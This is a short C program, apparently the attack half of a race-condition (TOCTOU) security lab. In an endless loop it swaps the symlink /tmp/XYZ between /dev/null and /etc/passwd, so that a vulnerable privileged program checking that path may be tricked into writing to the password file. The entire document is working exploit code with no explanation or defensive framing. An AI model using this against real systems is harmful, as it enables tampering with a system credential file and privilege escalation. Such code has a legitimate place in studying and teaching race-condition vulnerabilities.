#include <stdio.h>
#include <unistd.h>

int main()
{
    while(1) {
        // Remove the old symbolic link and create a new one
        unlink("/tmp/XYZ");
        symlink("/dev/null", "/tmp/XYZ");

        // Immediately switch to /etc/passwd
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
    }
    return 0;
}
